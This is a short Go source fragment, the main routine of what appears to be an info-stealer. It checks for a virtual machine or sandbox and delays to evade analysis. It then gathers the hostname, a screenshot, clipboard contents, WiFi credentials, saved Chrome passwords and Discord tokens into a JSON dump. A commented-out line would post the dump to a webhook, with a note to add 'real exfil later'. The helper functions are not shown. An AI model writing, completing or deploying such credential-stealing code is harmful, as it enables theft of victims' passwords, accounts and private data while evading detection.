func main() {
	if isVMOrSandbox() {
		time.Sleep(30 * time.Minute) // better than instant exit
		// os.Exit(0)
	}

	info := map[string]interface{}{
		"hostname":   getHostname(),
		"screenshot": takeScreenshot(),
		"clipboard":  getClipboard(),
		"wifi":       grabWiFi(),
	}

	creds := map[string]interface{}{
		"browser_passwords": grabChromePasswords(),
		"discord_tokens":    grabDiscordTokens(),
	}

	full := map[string]interface{}{
		"info":  info,
		"creds": creds,
		"time":  time.Now().UTC().Format(time.RFC3339),
	}

	jsonData, _ := json.MarshalIndent(full, "", "  ")
	ioutil.WriteFile("dump.json", jsonData, 0644)

	// Replace with your real exfil later
	// http.Post(your_webhook, "application/json", bytes.NewBuffer(jsonData))

	for {
		time.Sleep(24 * time.Hour)
	}
}
